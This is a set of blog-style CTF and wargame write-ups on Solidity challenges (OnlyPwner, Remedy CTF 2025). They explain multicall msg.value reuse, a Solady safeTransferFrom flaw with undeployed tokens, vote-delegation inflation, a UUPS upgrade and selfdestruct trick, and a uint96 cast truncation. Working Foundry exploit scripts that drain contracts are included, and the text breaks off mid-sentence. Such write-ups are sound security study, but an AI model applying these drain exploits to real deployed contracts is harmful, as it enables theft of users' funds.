[
  
  {
    "title": "OnlyPwner (ALL OR NOTHING/LIQUID STAKING) Write Ups",
    "url": "/posts/onlypwn/",
    "categories": "Wargame",
    "tags": "",
    "date": "2025-04-14 00:00:00 +0900",
    





    
    "snippet": "Summaryi tried to solve it(all or nothing/liquid staking) a year ago, but i couldn’t. since then, i’ve been gaining experience to try again. and finally i solved it today haha. i will update more s...",
    "content": "Summaryi tried to solve it(all or nothing/liquid staking) a year ago, but i couldn’t. since then, i’ve been gaining experience to try again. and finally i solved it today haha. i will update more soonALL OR NOTHING        if (allOrNothing.balance == 0) {            console.log(\"is-solved:true\");        } else {            console.log(\"is-solved:false\");        }we should drain assets of allOrNothing it to solve        AllOrNothing allOrNothing = new AllOrNothing(1 ether, 10 minutes);        allOrNothing.bet{value: 1 ether}(1, address(uint160(user) + 1));        allOrNothing.bet{value: 1 ether}(1, address(uint160(user) + 2));        allOrNothing.bet{value: 1 ether}(1, address(uint160(user) + 3));        allOrNothing.bet{value: 1 ether}(1, address(uint160(user) + 4));        allOrNothing.bet{value: 1 ether}(1, address(uint160(user) + 5));        payable(user).transfer(1 ether);when it comes to deploying a challenge, since 5 ethers were deposited into the AllOrNothing contract, we should drain all 5. and the player was given 1 etherpragma solidity 0.8.20;import {IAllOrNothing} from \"./interfaces/IAllOrNothing.sol\";import {Multicall} from \"./Multicall.sol\";/// A contract where users can bet on a random number being published./// The user who is closest to the number wins all the bets.contract AllOrNothing is IAllOrNothing, Multicall {    address public owner;    address public bestPlayer;    uint256 public winningNumber;    mapping(address =&gt; uint256) public bets;    uint256 public immutable BET_AMOUNT;    uint256 public immutable DEADLINE;    uint256 public immutable DECLARE_DEADLINE;    constructor(uint256 betAmount, uint256 duration) {        owner = msg.sender;        BET_AMOUNT = betAmount;        DEADLINE = block.timestamp + duration;        DECLARE_DEADLINE = DEADLINE + 1 days;    }    function declareWinner(address user) external {        require(bets[user] != 0, \"Must have placed bet\");        require(            block.timestamp &gt;= DEADLINE &amp;&amp; block.timestamp &lt; DECLARE_DEADLINE,            \"Deadline not passed\"        );        require(winningNumber != 0, \"Winning number not published\");        if (bestPlayer == address(0)) {            bestPlayer = user;            return;        }        unchecked {            uint256 distance = bets[user] &gt; winningNumber                ? bets[user] - winningNumber                : winningNumber - bets[user];            uint256 bestDistance = bets[bestPlayer] &gt; winningNumber                ? bets[bestPlayer] - winningNumber                : winningNumber - bets[bestPlayer];            if (distance &lt; bestDistance) {                bestPlayer = user;            }        }    }    function withdrawWinnings() external {        require(msg.sender == bestPlayer, \"Must be best player\");        require(block.timestamp &gt;= DECLARE_DEADLINE, \"Deadline not passed\");        payable(msg.sender).transfer(address(this).balance);    }    function bet(uint256 number, address recipient) external payable {        require(bets[recipient] == 0, \"Already placed bet\");        require(msg.value == BET_AMOUNT, \"Value too low\");        require(block.timestamp &lt; DEADLINE, \"Deadline passed\");        bets[recipient] = number;    }    function void() external {        require(bets[msg.sender] != 0, \"Must have placed bet\");        require(block.timestamp &lt; DEADLINE, \"Deadline passed\");        bets[msg.sender] = 0;        payable(msg.sender).transfer(BET_AMOUNT);    }    function transfer(address to) external {        require(bets[msg.sender] != 0, \"Must have placed bet\");        require(bets[to] == 0, \"Recipient must not have placed bet\");        bets[to] = bets[msg.sender];        bets[msg.sender] = 0;    }    function publish(uint256 number) external {        require(msg.sender == owner, \"Must be owner\");        require(block.timestamp &gt;= DEADLINE, \"Deadline not passed\");        winningNumber = number;    }}AllOrNothing is a contract similar to a lottery game, where the player ranked as bestPlayer receives a reward. the withdrawWinnings() and void() functions allow withdrawals, but we need to become the bestPlayer to call itto become the bestPlayer, we need to call the declareWinner() function, but the winningNumber must be set. however, since it hasn’t been set yet, we can’t use it. and void() is a function that allows users who joined the game to get a refund. if the player’s bet number is not 0, the BET_AMOUNT(1 ether) will be refunded to the playerthe player’s bet number can be set via the bet() function and user needs to send 1 ether to set it. currently, the balance given to us is 1 ether so we can set only one bet numbercontract Multicall is IMulticall {    function multicall(        bytes[] calldata data    ) external payable returns (bytes[] memory results) {        results = new bytes[](data.length);        for (uint256 i = 0; i &lt; data.length; i++) {            results[i] = doDelegateCall(data[i]);        }        return results;    }    function doDelegateCall(bytes memory data) private returns (bytes memory) {        (bool success, bytes memory res) = address(this).delegatecall(data);        if (!success) {            revert(string(res));        }        return res;    }}Currently, the AllOrNothing contract imports Multicall contract, allowing players to call the multicall() function. inside the deDelegateCall(), we can check that the delegatecall() function is called. in other words, a player can call the bet() function multiple times with just 1 ether by using multicall()we can exploit via this the logic but it’s impossible to call the bet(), void() functions 5 times. the reason is that while bet() is a payable function, void() is not. so the transaction reverts when a player tris to call the bet(), void() functions directly.so we can simply generate multicall payloads to call the bet() function using the addresses after appending 5 target addresses// SPDX-License-Identifier: UNLICENSEDpragma solidity ^0.8.13;import {Script, console} from \"forge-std/Script.sol\";import {AllOrNothing} from \"../src/AllOrNothing.sol\";contract Solve is Script {    AllOrNothing public aot;    address public playeraddr = 0x34788137367a14f2C4D253F9a6653A93adf2D234;    uint256 public playerpv = 0xbe0a5d9f38057fa406c987fd1926f7bfc49f094dc4e138fc740665d179e6a56a;    address[] public usersaddr;    uint256[] public userspv;    constructor() {        aot = AllOrNothing(0x78aC353a65d0d0AF48367c0A16eEE0fbBC00aC88);    }    function drains() public {        console.log(\"Start to drain\");        for (uint i = 1; i &lt; usersaddr.length; i++) {            vm.startBroadcast(userspv[i]);            aot.void();            vm.stopBroadcast();        }    }    function run() public {        bytes[] memory payloads = new bytes[](6);        console.log(\"Start amennnnnn\");        usersaddr.push(playeraddr);        userspv.push(playerpv);        payloads[0] = abi.encodeWithSelector(aot.bet.selector, 1, usersaddr[0]);        for (uint i = 0; i &lt; 5; i++) {            (address addr, uint256 pv) = makeAddrAndKey(vm.toString((i)));            usersaddr.push(addr);            userspv.push(pv);            payloads[i + 1] = abi.encodeWithSelector(aot.bet.selector, 1, addr);        }        vm.startBroadcast(userspv[0]);        console.log(\"challeng's balance before ex : \", address(aot).balance);        console.log(\"user's balance before ex : \", address(playeraddr).balance);        aot.multicall{value : 1 ether}(payloads);        aot.void();        vm.stopBroadcast();        drains();        console.log(\"challenge's balance after ex : \", address(aot).balance);    }}//  forge script --broadcast --rpc-url $RPC_URL Solve -vvv --with-gas-price 0 --priority-gas-price 0the payload is written as shown abovethen if we run the code, we can see the result like thisLIQUID STAKING        if (stf.syntheticsLength() == 0 || user.balance &lt; 100 ether) {            console.log(\"is-solved:false\");            return;        }        console.log(\"is-solved:true\");we must create a synthetic token, and the player’s balance must remain at 100 ether        user.call{value: 100 ether}(\"\");        PoolVault pv = new PoolVault();        SyntheticTokenFactory stf = new SyntheticTokenFactory(address(this), pv);100 ether is given to the player so we must ensure synthetics.length &gt; 0 while keeping the player’s balance unchanged at 100 ether\t\taddress[] public synthetics;// (...)    function syntheticsLength() external view returns(uint) {        return synthetics.length;    }the syntheticsLength() function of the SyntheticTokenFactory contract returns the length of the synthetics    function createSynthetic() external payable returns (address) {        require(msg.value &gt;= 1 ether, \"STF: No native tokens provided\");        SyntheticToken st = new SyntheticToken(++currentSequence, msg.value);        mintedSupply += msg.value;        isActive[address(st)] = true;        synthetics.push(address(st));        uint feeAmt = msg.value / 10;        st.approve(address(poolVault), feeAmt);        poolVault.depositFor(address(st), feeReceiver, feeAmt);        st.transfer(msg.sender, msg.value - feeAmt);        return address(st);    }the length of the synthetics array increases when the createSynthetic() function is called. we can check that it creates a SyntheticToken contract and appends its addressed to the synthetics array. in other words, first condition will be satisfied if a player calls ithowever, to call this function, a balance of at least 1 ether must be provided, so the user spends 1 ether. After the function call, the user’s balance becomes 99 etherin the createSynthetic() function, after deploying the token contract, the fee is calculated based on the msg.value and sent to the poolVault. if 1 ether is sent, the fee is 0.1 ether. the remaining 0.9 ether is transferred to the user in the form of the newly created synthetic token    function redeemTokens(address synthetic, uint amount) external {        require(isActive[synthetic], \"STF: Not a synthetic\");        SyntheticToken st = SyntheticToken(synthetic);        st.burn(msg.sender, amount);        if(st.totalSupply() == 0){            isActive[synthetic] = false;        }        mintedSupply -= amount;        SafeTransferLib.safeTransferETH(msg.sender, amount);    }since the SyntheticTokenFactory contract provides the redeemTokens() function, the user can withdraw the 0.9 ether worth of tokens at any timebecause the 0.9 ether is always redeemable, the user’s effective balance is now 99.9 ether, excluding the 0.1 ether fee. therefore, we still need to recover the remaining 0.1 ethercontract PoolVault is IPoolVault {    using SafeTransferLib for address;    mapping(address synthetic =&gt; mapping (address owner =&gt; uint)) public balance;    function depositFor(address synthetic, address beneficiary, uint amount) external {        synthetic.safeTransferFrom(msg.sender, address(this), amount);        balance[synthetic][beneficiary] += amount;    }    function withdraw(address synthetic, uint amount) external {        balance[synthetic][msg.sender] -= amount;        synthetic.safeTransfer(msg.sender, amount);    }}the PoolVault contract defines the depositFor() and withdraw() functions as described above. a user can call depositFor() to deposit pool tokens and increase the value of balance[synthetic][beneficiary]. the withdraw() function allows a user to withdraw tokens up to the amount recorded in balance[synthetic][beneficiary]in the createSynthetic() function, when a synthetic token is created, the contract calls PoolVault’s depositFor() function to transfer feeAmt (0.1 ether) to the vault. At this point, balance[synthetic][feeReceiver] is set to 0.1 ether. since the withdraw() function checks the balance using msg.sender, only the feeReceiver is able to withdraw this 0.1 etherhowever, the depositFor() function is externally callable and uses Solady’s safeTransferFrom() function to transfer ERC20 tokens    function safeTransferFrom(address token, address from, address to, uint256 amount) internal {        /// @solidity memory-safe-assembly        assembly {            let m := mload(0x40) // Cache the free memory pointer.            mstore(0x60, amount) // Store the `amount` argument.            mstore(0x40, to) // Store the `to` argument.            mstore(0x2c, shl(96, from)) // Store the `from` argument.            mstore(0x0c, 0x23b872dd000000000000000000000000) // `transferFrom(address,address,uint256)`.            let success := call(gas(), token, 0, 0x1c, 0x64, 0x00, 0x20)            if iszero(and(eq(mload(0x00), 1), success)) {                if iszero(lt(or(iszero(extcodesize(token)), returndatasize()), success)) {                    mstore(0x00, 0x7939f424) // `TransferFromFailed()`.                    revert(0x1c, 0x04)                }            }            mstore(0x60, 0) // Restore the zero slot to zero.            mstore(0x40, m) // Restore the free memory pointer.        }    }// lib/solady/src/utils/SafeTransferLib.solthe safeTransferFrom() function in solady’s SafeTransferLib does not revert if the token contract has not been deployed yet. this behavior is the root cause of the issue.lt(or(iszero(extcodesize(token)), returndatasize()), success)as described above, a revert in safeTransferFrom() only occurs when the following conditions are met: extcodesize(token) &gt; 0, returndatasize == 0, and success == 0.in other words, a revert only happens when the target address is a deployed contract (i.e., it has code), the call fails, and no return data is provided. if the contract has not been deployed yet (i.e., extcodesize == 0), the function does not revertthis means that by calling depositFor() with the address of an ERC20 token that hasn’t been deployed yet, the contract attempts to transfer 0.1 ether worth of tokens using safeTransferFrom(). because the target address has no code, the function does not revert—even though the token does not exist yetas a result, balance[synthetic][player] is increased by 0.1 ether, even though no actual token transfer occurredto perform this exploit, the player must be able to precompute the address of the synthetic token that will be deployed later⬇︎ calls PoolVault::depositFor() \t⬇︎ balance[synthetic][player] = 0.1 ether\t⬇︎ calls SyntheticTokenFactory::createSynthetic{value : 1 ether}()\t⬇︎ user's eth balance : 99 ether \t⬇︎ synthetics.push(address(st)); // create a token\t⬇︎ calls PoolVault::depositFor() \t\t⬇︎ synthetic.balanceOf(feeReceiver) = 0.1 ether\t\t⬇︎ balance[synthetic][feeReceiver] = 0.1 ether\t\t⬇︎ calls SyntheticTokenFactory::redeemTokens()\t⬇︎ safeTransferETH(player, 0.9 ether);\t⬇︎ user's eth balance : 99.9 ether \t⬇︎ calls PoolVault::withdraw()\t⬇︎ balance[synthetic][player] = 0\t⬇︎ synthetic.balanceOf(player) = 0.1 ether⬇︎ calls SyntheticTokenFactory::redeemTokens()\t\t⬇︎ safeTransferETH(player, 0.1 ether);\t\t⬇︎ user's eth balance : 100 ether \t\t⬇︎ syntheticsLength : 1based on the information above, the challenge can be solved by executing the exploit as describedpragma solidity 0.8.21;import {Script} from \"forge-std/Script.sol\";import {console} from \"forge-std/console.sol\";import {SyntheticTokenFactory} from \"../src/SyntheticTokenFactory.sol\";import {PoolVault} from \"../src/PoolVault.sol\";contract Solve is Script {    SyntheticTokenFactory public synthetictokenfactory;    PoolVault public poolvault;    address st;        function run() public {        synthetictokenfactory = SyntheticTokenFactory(0xfA43a58F761B40686a27c5210F533ABeea397cb0);        poolvault = PoolVault(0x91B617B86BE27D57D8285400C5D5bAFA859dAF5F);        st = synthetictokenfactory.createSynthetic{value : 1 ether}();        console.log(\"SyntheticToken's address : \", st);    }}the synthetic token address can be predicted in advance using the code shown abovethe token address is as shown abovepragma solidity 0.8.21;import {Script} from \"forge-std/Script.sol\";import {console} from \"forge-std/console.sol\";import {SyntheticTokenFactory} from \"../src/SyntheticTokenFactory.sol\";import {PoolVault} from \"../src/PoolVault.sol\";import {SyntheticToken} from \"../src/SyntheticToken.sol\";contract Solve is Script {    SyntheticTokenFactory public synthetictokenfactory;    PoolVault public poolvault;    SyntheticToken public synthetictoken;    uint256 playerPv = vm.envUint(\"PRIVATE_KEY\");    address public player = 0x34788137367a14f2C4D253F9a6653A93adf2D234;    address public st = 0xEC7FF86bc173C5d15a1B93570d36AF8dB96E0b2b;        function run() public {        vm.startBroadcast(playerPv);        console.log(\"start\");        synthetictokenfactory = SyntheticTokenFactory(0xfA43a58F761B40686a27c5210F533ABeea397cb0);        poolvault = PoolVault(0x91B617B86BE27D57D8285400C5D5bAFA859dAF5F);        poolvault.depositFor(st, player, 0.1 ether);        uint256 balance = poolvault.balance((st), player);        assert(balance == 0.1 ether);        console.log(\"user's balance before creating Synthetic : \", player.balance);        synthetictokenfactory.createSynthetic{value : 1 ether}();        console.log(\"user's balance after creating Synthetic : \", player.balance);        poolvault.withdraw(st, 0.1 ether);        synthetictokenfactory.redeemTokens(st, 1 ether);        assert(synthetictokenfactory.syntheticsLength() &gt; 0 &amp;&amp; player.balance == 100 ether);        console.log(\"user's balance after Synthetic : \", player.balance);        console.log(\"clear\");        vm.stopBroadcast();    }}// forge script --broadcast --rpc-url $RPC_URL Solve -vvv --with-gas-price 0 --priority-gas-price 0the full exploit code is provided abovethen if we run the code, we can see the result like this. amenn"
  },
  
  {
    "title": "Remedy CTF 2025 (Diamond, Rich, Casino)",
    "url": "/posts/Remedy-CTF2525/",
    "categories": "CTF",
    "tags": "",
    "date": "2025-01-26 00:00:00 +0900",
    





    
    "snippet": "i could solve only two easy solidity challs :/ in the casino challenge, i was able to bypass the signature but not the bet() function. hope that i will be betterDiamoand Heist    uint constant publ...",
    "content": "i could solve only two easy solidity challs :/ in the casino challenge, i was able to bypass the signature but not the bet() function. hope that i will be betterDiamoand Heist    uint constant public DIAMONDS = 31337;    uint constant public HEXENS_COINS = 10_000 ether;    bool claimed;        constructor (address player) {        PLAYER = player;        vaultFactory = new VaultFactory();        vault = vaultFactory.createVault(keccak256(\"The tea in Nepal is very hot. But the coffee in Peru is much hotter.\"));        diamond = new Diamond(DIAMONDS);        hexensCoin = new HexensCoin();        vault.initialize(address(diamond), address(hexensCoin));        diamond.transfer(address(vault), DIAMONDS);    }// (...) Skip    function isSolved() external view returns (bool) {        return diamond.balanceOf(PLAYER) == DIAMONDS;    }we should take 31337 tokens to solve this challenge and diamond is ERC20 token and it already been transferred 31337 tokens to the Vaultcontract Vault is Initializable, UUPSUpgradeable, OwnableUpgradeable {    uint constant public AUTHORITY_THRESHOLD = 100_000 ether;    Diamond diamond;    HexensCoin hexensCoin;    function initialize(address diamond_, address hexensCoin_) public initializer {        __Ownable_init();        diamond = Diamond(diamond_);        hexensCoin = HexensCoin(hexensCoin_);    }    function governanceCall(bytes calldata data) external {        require(msg.sender == owner() || hexensCoin.getCurrentVotes(msg.sender) &gt;= AUTHORITY_THRESHOLD);        (bool success,) = address(this).call(data);        require(success);    }    function burn(address token, uint amount) external {        require(msg.sender == owner() || msg.sender == address(this));        Burner burner = new Burner();        IERC20(token).transfer(address(burner), amount);        burner.destruct();    }        function _authorizeUpgrade(address) internal override view {        require(msg.sender == owner() || msg.sender == address(this));        require(IERC20(diamond).balanceOf(address(this)) == 0);    }}if we can call the governanceCall() function, we can abuse the Vault Contract but we need to vote 100_000 ether for it. (but we have only 10_000 ether :/)    function _delegate(address delegator, address delegatee)        internal    {        address currentDelegate = _delegates[delegator];        uint256 delegatorBalance = balanceOf(delegator);        _delegates[delegator] = delegatee;        emit DelegateChanged(delegator, currentDelegate, delegatee);        _moveDelegates(currentDelegate, delegatee, delegatorBalance);    }    function _moveDelegates(address srcRep, address dstRep, uint256 amount) internal {        if (srcRep != dstRep &amp;&amp; amount &gt; 0) {            if (srcRep != address(0)) {                uint32 srcRepNum = numCheckpoints[srcRep];                uint256 srcRepOld = srcRepNum &gt; 0 ? checkpoints[srcRep][srcRepNum - 1].votes : 0;                uint256 srcRepNew = srcRepOld - amount;                _writeCheckpoint(srcRep, srcRepNum, srcRepOld, srcRepNew);            }            if (dstRep != address(0)) {                uint32 dstRepNum = numCheckpoints[dstRep];                uint256 dstRepOld = dstRepNum &gt; 0 ? checkpoints[dstRep][dstRepNum - 1].votes : 0;                uint256 dstRepNew = dstRepOld + amount;                _writeCheckpoint(dstRep, dstRepNum, dstRepOld, dstRepNew);            }        }    }they provided only 10_000 ether so we cannot vote for 100_000 ether in general but we can exploit the process of delegated voting. however if srcRep is not zero address in _moveDeleages, it subtracts amout we want to vote from old votes.player → user2 (10_000 ether)_delegate(user2, player)player.votes = 10_000 ether_deleages[user2] = playeruser2 → player (10_000 ether)player→user3 (10_000 ether)_deleagete(user3, player) at this time, the sender is different so srcRep is zero address  even though we voted before. therefore our vote won’t go through the process to subtractionplayer.votes = 20_000 ether_delegates[user3] = playeruser3 → player (10_000 ether)however we can solve this issue with the way to delegate to player from new CA. therefore, we should transfer 10_000 ether to new CA then the CA should transfer it back to player after delegation. ⇒ we can get 100_000 ether votes after repeating it 10 times// SPDX-License-Identifier: UNLICENSEDpragma solidity 0.8.13;import \"forge-std/Script.sol\";import \"../src/Challenge.sol\";import \"../src/HexensCoin.sol\";contract ASDF {    HexensCoin public hexensCoin;    address public player;    constructor (address hexens, address _player) {        hexensCoin = HexensCoin(hexens);        player = _player;    }    function votesTransfer() external {        hexensCoin.delegate(player);        hexensCoin.transfer(player, 10_000 ether);    }}contract Solve is Script {    address private challengeAddress = 0x32fFc5cC2567c69a31dc2d0E71579A325828Af5F;    uint256 private playerPrivateKey = 0xb0f205587a31546a5ebb5ac2f42bbaf6a6ffe841192610a98349c63f3a82a466;    function run() external {        vm.startBroadcast(playerPrivateKey);        Challenge challenge = Challenge(challengeAddress);        HexensCoin hexensCoin = challenge.hexensCoin();        address hexen_addr = address(hexensCoin);        address player = vm.addr(playerPrivateKey);        challenge.claim();        for(uint i = 0; i &lt; 10; i++){            ASDF asdf = new ASDF(hexen_addr, player);            hexensCoin.transfer(address(asdf), 10_000 ether);            asdf.votesTransfer();        }        console.log(\"votes : \", hexensCoin.getCurrentVotes(player));        vm.stopBroadcast();    }}now we have 100_000 ether votes  so can call the governanceCall() function of Vault.sol.  we need to think what we can do with governanceCall() function.first of all, we know that the vault contract has 31337 tokens but we cannot transfer it to our address by governanceCall() function but the Contract is implemented with the UUPSUpgradeable protocol so it can be upgrade to our contract    function burn(address token, uint amount) external {        require(msg.sender == owner() || msg.sender == address(this));        Burner burner = new Burner();        IERC20(token).transfer(address(burner), amount);        burner.destruct();    }        function _authorizeUpgrade(address) internal override view {        require(msg.sender == owner() || msg.sender == address(this));        require(IERC20(diamond).balanceOf(address(this)) == 0);    }but to upgrade, Vault’s balance of diamond should 0 so we should call the burn() function to transfer token to burner address. (buner will be destroyed too). that means we shoud re-use buner address.address = keccak256(rlp([deployer_address, nonce]))[12:]however in EVM, addresses are generated as above (msg.sender, nonce), so this is not a big problem. we’re gonna destroy contract then deploy again with our contract, it will deploy on the same address    function _upgradeToAndCallUUPS(        address newImplementation,        bytes memory data,        bool forceCall    ) internal {        // Upgrades from old implementations will perform a rollback test. This test requires the new        // implementation to upgrade back to the old, non-ERC1822 compliant, implementation. Removing        // this special case will break upgrade paths from old UUPS implementation to new ones.        if (StorageSlot.getBooleanSlot(_ROLLBACK_SLOT).value) {            _setImplementation(newImplementation);        } else {            try IERC1822Proxiable(newImplementation).proxiableUUID() returns (bytes32 slot) {                require(slot == _IMPLEMENTATION_SLOT, \"ERC1967Upgrade: unsupported proxiableUUID\");            } catch {                revert(\"ERC1967Upgrade: new implementation is not UUPS\");            }            _upgradeToAndCall(newImplementation, data, forceCall);_upgradeToAndCallUUPS() function of ERC1967Upgrade will call the proxiableUUID() function from our contract so we should define it.Solve.sol// SPDX-License-Identifier: UNLICENSEDpragma solidity 0.8.13;import \"forge-std/Script.sol\";import \"../src/Challenge.sol\";import \"../src/HexensCoin.sol\";import \"../src/MaliciousVault.sol\";contract ASDF {    HexensCoin public hexensCoin;    address public player;    constructor (address hexens, address _player) {        hexensCoin = HexensCoin(hexens);        player = _player;    }    function votesTransfer() external {        hexensCoin.delegate(player);        hexensCoin.transfer(player, 10_000 ether);    }}contract Solve is Script {    address private challengeAddress = 0xA496102C58a59bfec07c14b08C1b976fd242ec91;    uint256 private playerPrivateKey = 0xfc986909eb13d86baa48c0d89e4c25ead0b2967ade984e9805a09bdeacb7baf0;    function run() external {        vm.startBroadcast(playerPrivateKey);        Challenge challenge = Challenge(challengeAddress);        HexensCoin hexensCoin = challenge.hexensCoin();        address factoryAddress = address(challenge.vaultFactory());        address vaultAddress = address(challenge.vault());        address diamondAddress = address(challenge.diamond());        address hexen_addr = address(hexensCoin);        address player = vm.addr(playerPrivateKey);        challenge.claim();        for(uint i = 0; i &lt; 10; i++){            ASDF asdf = new ASDF(hexen_addr, player);            hexensCoin.transfer(address(asdf), 10_000 ether);            asdf.votesTransfer();        }        require(hexensCoin.getCurrentVotes(player) == 100_000 ether);        console.log(\"votes : \", hexensCoin.getCurrentVotes(player));                bytes memory burnData = abi.encodeWithSignature(            \"burn(address,uint256)\",            diamondAddress,            IERC20(diamondAddress).balanceOf(vaultAddress)        );        Vault(vaultAddress).governanceCall(burnData);        MaliciousVault maliciousImplementation = new MaliciousVault();        console.log(\"maliciousImplementation : \", address(maliciousImplementation));        bytes memory upgradeData = abi.encodeWithSignature(            \"upgradeTo(address)\",            address(maliciousImplementation)        );        Vault(vaultAddress).governanceCall(upgradeData);        bytes memory selfDestructData = abi.encodeWithSignature(\"selfDestruct()\");        vaultAddress.call(selfDestructData);        vm.stopBroadcast();    }}Solve1.sol// SPDX-License-Identifier: UNLICENSEDpragma solidity 0.8.13;import \"forge-std/Script.sol\";import \"../src/Challenge.sol\";import \"../src/HexensCoin.sol\";import \"../src/MaliciousVault.sol\";contract Solve1 is Script {    address private challengeAddress = 0xA496102C58a59bfec07c14b08C1b976fd242ec91;    uint256 private playerPrivateKey = 0xfc986909eb13d86baa48c0d89e4c25ead0b2967ade984e9805a09bdeacb7baf0;    function run() external {        vm.startBroadcast(playerPrivateKey);        Challenge challenge = Challenge(challengeAddress);        HexensCoin hexensCoin = challenge.hexensCoin();        Vault vault = challenge.vault();        address factoryAddress = address(challenge.vaultFactory());        address vaultAddress = address(challenge.vault());        address diamondAddress = address(challenge.diamond());        address hexen_addr = address(hexensCoin);        address player = vm.addr(playerPrivateKey);        Diamond diamond = challenge.diamond();        VaultFactory factory = VaultFactory(factoryAddress);        bytes32 salt = keccak256(\"The tea in Nepal is very hot. But the coffee in Peru is much hotter.\");        Vault newVault = factory.createVault(salt);        newVault.initialize(address(diamond), address(hexensCoin));        MaliciousVault maliciousImplementation = new MaliciousVault();        bytes memory upgradeNewVaultData = abi.encodeWithSignature(            \"upgradeTo(address)\",            address(maliciousImplementation)        );        vault.governanceCall(upgradeNewVaultData);        bytes memory transferData = abi.encodeWithSignature(            \"_CREATE2(address,address)\",            diamondAddress,            player        );        address(newVault).call(transferData);        console.log(\"diamond.balanceOf(PLAYER) : \", diamond.balanceOf(player));        vm.stopBroadcast();    }}MaliciousVault.sol// SPDX-License-Identifier: UNLICENSEDpragma solidity 0.8.13;import \"./openzeppelin-contracts/token/ERC20/ERC20.sol\";import \"../src/MaliciousVault.sol\";contract MaliciousVault {    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;    function proxiableUUID() external view returns (bytes32) {        return _IMPLEMENTATION_SLOT;    }        function selfDestruct() external {        selfdestruct(payable(msg.sender));    }    function _CREATE2(address _diamond, address player) external {        LastOne lastone = new LastOne(_diamond, player);    }}contract LastOne {    constructor(address diamond, address player) {        IERC20(diamond).transfer(player, IERC20(diamond).balanceOf(address(this)));    }}so just attack to get the flag using this logicRich Man’s bet    function isSolved() external view returns (bool) {        return challengeSolved             &amp;&amp; solver == PLAYER             &amp;&amp; address(BRIDGE).balance == 0;    }we should solve easy math challenge then drain the balance of the BRIDGE contract    function withdrawEth(bytes32 messageHash, bytes[] calldata signatures, address receiver, uint amount, bytes calldata callback) external onlyValidator {        require(amount &gt; 0, \"Amount must be greater than zero\");        require(!processedMessages[messageHash], \"Message already processed\");        uint256 accumulatedWeight = 0;        address lastSigner = address(0);        for (uint256 i = 0; i &lt; signatures.length; i++) {            address signer = messageHash.toEthSignedMessageHash().recover(signatures[i]);            require(signer != lastSigner, \"Repeated signer\");            // Ensure signer is in the withdraw validator list            bool isValidValidator = false;            for (uint256 j = 0; j &lt; withdrawValidators.length; j++) {                if (withdrawValidators[j] == signer) {                    isValidValidator = true;                    break;                }            }            require(isValidValidator, \"Invalid withdraw validator\");            // Count each valid validator equally            accumulatedWeight += 1;            lastSigner = signer;        }        require(            accumulatedWeight &gt;= threshold,            \"Insufficient weight to process withdrawal\"        );        // Mark the message as processed        processedMessages[messageHash] = true;        // Transfer ETH to the recipient        if (amount &gt; address(this).balance)            amount = address(this).balance;        (bool success, ) = payable(receiver).call{value: amount}(callback);        emit EthWithdrawn(msg.sender, success, amount);    }there is withdrawEth() function in BRIDGE contract but to use, we shoud bypass the onlyValidator() modifier and go through the process of comparing accumulatedWeight with threshold    modifier onlyValidator() {        require(validatorWeights[msg.sender] &gt; 0, \"Caller is not a bridge setting validator\");        _;    }    // (...) Skip     function onERC1155Received(        address,        address from,        uint256,        uint256,        bytes calldata    ) external override onlyAdminNft returns (bytes4) {        if (validatorWeights[from] == 0) {            bridgeSettingValidators.push(from);        }        validatorWeights[from] += NFT_WEIGHT;        totalWeight += NFT_WEIGHT;        return this.onERC1155Received.selector;    }    // Handle batch deposits of NFTs and register/update validators for bridge settings    function onERC1155BatchReceived(        address,        address from,        uint256[] calldata ids,        uint256[] calldata,        bytes calldata    ) external override onlyAdminNft returns (bytes4) {        uint256 totalAddedWeight = 0;        if (ids.length &gt; 1) {            for (uint256 i = 0; i &lt; ids.length; i++) {                totalAddedWeight += NFT_WEIGHT;            }        } else {            totalAddedWeight = NFT_WEIGHT;        }        validatorWeights[from] += totalAddedWeight;        totalWeight += totalAddedWeight;        if (validatorWeights[from] == totalAddedWeight) {            bridgeSettingValidators.push(from);        }        return this.onERC1155BatchReceived.selector;    }the way to bypass the onlyValidator() modifier is simple: just pass if the validatorWeights[msg.sender] is bigger than 0. in onERC1155Received() and onERC1155BatchReceived() function, validatorWeights value is managed so we can control it if we call this functions. typically, the two functions is callback function from some library    function _doSafeTransferAcceptanceCheck(        address operator,        address from,        address to,        uint256 id,        uint256 amount,        bytes memory data    ) private {        if (to.isContract()) {            try IERC1155Receiver(to).onERC1155Received(operator, from, id, amount, data) returns (bytes4 response) {                if (response != IERC1155Receiver.onERC1155Received.selector) {                    revert(\"ERC1155: ERC1155Receiver rejected tokens\");                }            } catch Error(string memory reason) {                revert(reason);            } catch {                revert(\"ERC1155: transfer to non-ERC1155Receiver implementer\");            }        }    }_doSafeTransferAcceptanceCheck() function is the function of ERC1151 and it calls onERC1155Received() function so we can call also this function if we call the safeTransferFrom() or safeBatchTransferFrom() functionso just call like this: adminNFT.safeTransferFrom(player, address(bridge), 0, 0, bytes(\"\")); then validatorWeights[player] will be 50. and now last thihg we need to do is that accumulatedWeight make equal or bigger than threshold (threshold is set to 10)    function changeBridgeSettings(        bytes calldata message,        bytes[] calldata signatures    ) external onlyValidator {        uint256 accumulatedWeight = 0;        address lastSigner = address(0);        address newChallengeContract;        address newAdminNftContract;        uint256 newThreshold;        for (uint256 i = 0; i &lt; signatures.length; i++) {            address signer = message.toEthSignedMessageHash().recover(signatures[i]);            require(signer != lastSigner, \"Repeated signer\");            if (validatorWeights[signer] &gt; 0) {                accumulatedWeight += validatorWeights[signer];            }            lastSigner = signer;        }        require(            accumulatedWeight &gt;= totalWeight / 2,            \"Insufficient weight to change settings\"        );        // Decode new parameters from the message        (newChallengeContract, newAdminNftContract, newThreshold) = abi.decode(            abi.encodePacked(message),            (address, address, uint256)        );        require(newThreshold &gt; 1, \"New threshold must be above 1\");        // Call internal function to update bridge settings        _updateBridge(newChallengeContract, newAdminNftContract, newThreshold);    }    // Internal function to update bridge settings    function _updateBridge(address newChallengeContract, address newAdminNftContract, uint256 newThreshold) internal {        challengeContract = newChallengeContract;        adminNftContract = newAdminNftContract;        threshold = uint96(newThreshold);        emit BridgeUpdated(newChallengeContract, newAdminNftContract, newThreshold);    }and now it’s turn to go through the process of comparing accumulatedWeight with threshold  but it’s hard to sign but there is changeBridgeSettings() function which provied function to change settings (including threshold) if we can set the threshold to 0, we don’t need to sign but it checks the newThreshold is bigger than 0 or not so in general, we cannot set it to zerohowever there is one stupid casting. in changeBridgeSettings() function, newThreshold is uint256 but in _updateBridge() function, newThreshold is casted by the uint96() functionuint256’s maximum value is 2 ** 256 -1 and uint96’s maximum value is 2 ** 96 -1. so if uint256:2 ** 